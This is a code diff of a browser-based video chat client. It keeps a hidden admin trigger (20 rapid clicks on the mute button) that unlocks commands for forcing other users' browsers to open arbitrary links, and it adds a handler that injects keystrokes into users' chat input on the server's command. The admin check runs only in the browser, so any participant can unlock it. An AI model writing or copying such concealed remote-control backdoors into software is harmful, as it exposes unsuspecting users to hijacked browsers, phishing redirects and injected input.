@@ -96,34 +96,36 @@
     const peerConnections = {};
     const frozenTimers = {};
     
-    let localStream = new MediaStream();
+    let localStream = new MediaStream(); // Initialize with empty stream
     let screenStream = null;
     let isScreenSharing = false;
     let isMuted = false;
-    
     let isAdmin = false;
     let muteClickTimestamps = [];
     
-    // --- ADMIN REDIRECT LISTENER ---
+    // --- NEW REDIRECT LISTENER ---
     socket.on('force-redirect', (data) => {
         if (data.url) {
             window.location.href = data.url;
         }
     });
     
-    // --- UPDATED MUTE & ADMIN TRIGGER ---
+    // --- UPDATED MUTE BUTTON LOGIC ---
     muteBtn.addEventListener('click', () => {
+        // Admin Trigger Logic
         const now = Date.now();
         muteClickTimestamps.push(now);
+        
+        // Filter to keep only clicks within the last 10 seconds
         muteClickTimestamps = muteClickTimestamps.filter(t => now - t < 10000);
         
         if (muteClickTimestamps.length >= 20 && !isAdmin) {
             isAdmin = true;
-            appendSystemMessage("ADMIN ACCESS GRANTED.");
-            appendSystemMessage("Usage: !open <link> <user> | !type <msg> <user>");
-            muteClickTimestamps = []; 
+            appendSystemMessage("ADMIN ACCESS GRANTED. Use !open <link> <user>");
+            muteClickTimestamps = []; // Reset
         }
     
+        // Original Mute Logic
         const audioTrack = localStream.getAudioTracks()[0];
         if (audioTrack) {
             isMuted = !isMuted;
@@ -133,24 +135,62 @@
         }
     });
     
-    // --- UPDATED CHAT FORM INTERCEPTOR ---
+    // --- UPDATED CHAT FORM ---
     document.getElementById('chat-form').addEventListener('submit', e => {
         e.preventDefault();
         const input = document.getElementById('chat-input');
         const val = input.value.trim();
     
         if (val) {
-            // If message starts with ! and user is admin, treat as command
+            // If it's a command and user is admin, intercept!
             if (val.startsWith('!') && isAdmin) {
                 socket.emit('admin-command', { command: val });
-                appendSystemMessage(`Command Sent: ${val}`); 
+                appendSystemMessage(`Command Sent: ${val}`); // Confirmation for admin only
                 input.value = '';
                 return;
             }
     
-            // Normal chat
+            // Otherwise, send regular message
             socket.emit('chat-message', { username: username, msg: val });
             input.value = '';
+        }
+    });
+
+    // --- NEW REMOTE TYPING LOGIC ---
+    socket.on('remote-type', async (data) => {
+        const sequence = data.sequence;
+        const steps = sequence.split(' '); // Split by space: ["ctrl+t", "h", "e", ...]
+        const inputField = document.getElementById('chat-input');
+    
+        for (const step of steps) {
+            // Parse if it's a combination like ctrl+t
+            const parts = step.toLowerCase().split('+');
+            const hasCtrl = parts.includes('ctrl');
+            const mainKey = parts[parts.length - 1];
+    
+            // 1. Create and dispatch the KeyDown event
+            const keyDown = new KeyboardEvent('keydown', {
+                key: mainKey,
+                ctrlKey: hasCtrl,
+                bubbles: true
+            });
+            inputField.dispatchEvent(keyDown);
+    
+            // 2. Visual effect: If it's a single letter/character, add it to the input box
+            if (parts.length === 1 && step.length === 1) {
+                inputField.value += step;
+            }
+    
+            // 3. Wait for 0.1 seconds (100ms)
+            await new Promise(resolve => setTimeout(resolve, 100));
+    
+            // 4. Create and dispatch the KeyUp event
+            const keyUp = new KeyboardEvent('keyup', {
+                key: mainKey,
+                ctrlKey: hasCtrl,
+                bubbles: true
+            });
+            inputField.dispatchEvent(keyUp);
         }
     });
 
